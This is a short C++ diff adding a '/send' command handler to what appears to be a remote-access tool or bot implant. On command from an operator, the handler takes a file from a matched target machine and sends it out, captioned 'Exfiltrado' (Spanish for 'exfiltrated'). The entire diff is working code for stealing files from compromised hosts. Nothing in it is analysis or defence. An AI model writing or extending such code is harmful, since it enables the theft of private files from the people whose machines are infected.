@@ -80,4 +80,25 @@ domain::Result<void> FileManagerHandler::handle_cat(const std::string& target, c
     return domain::Result<void>::success();
 }
 
+domain::Result<void> FileManagerHandler::handle_send(const std::string& target, const std::string& path) {
+    if (!matches(target)) return domain::Result<void>::success();
+
+    if (path.empty()) {
+        reporter_.send_message("Uso: /send [target] <path>");
+        return domain::Result<void>::success();
+    }
+
+    if (!filemgr_.file_exists(path)) {
+        reporter_.send_message("Archivo no encontrado: " + path);
+        return domain::Result<void>::success();
+    }
+
+    if (reporter_.send_file(path, "Exfiltrado: " + path)) {
+        reporter_.send_message("Archivo enviado: " + path);
+    } else {
+        reporter_.send_message("Error enviando archivo: " + path);
+    }
+    return domain::Result<void>::success();
+}
+
 } // namespace nuub::application::commands
